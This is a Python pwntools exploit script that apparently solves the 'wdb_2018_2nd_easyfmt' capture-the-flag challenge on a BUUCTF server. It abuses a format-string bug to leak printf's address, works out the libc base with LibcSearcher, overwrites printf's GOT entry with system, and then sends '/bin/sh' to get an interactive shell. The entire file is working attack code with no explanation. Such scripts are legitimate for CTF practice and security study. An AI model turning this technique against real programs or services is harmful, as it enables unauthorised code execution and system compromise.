# coding:utf-8

from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

#p = process('wdb_2018_2nd_easyfmt')
p = remote('node3.buuoj.cn', 29131)
elf = ELF('wdb_2018_2nd_easyfmt')

#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')

printf_got = elf.got['printf']
payload1 = p32(printf_got) + '%6$s'
p.sendlineafter('repeater?\n', payload1)

p.recv(4)
printf_addr = u32(p.recv(4))

log.success('printf_addr => {}'.format(hex(printf_addr)))
libc = LibcSearcher('printf', printf_addr)
#libc_base = printf_addr - elf.sym['printf']
#system_addr = libc_base + elf.sym['system']
libc_base = printf_addr - libc.dump('printf')
system_addr = libc_base + libc.dump('system') 
print('libc_base: ', libc_base)
print('system_addr: ', system_addr)

payload2 = fmtstr_payload(6,{
    printf_got:system_addr
    })
p.send(payload2)
sleep(0.5)
p.send('/bin/sh\x00')

p.interactive()
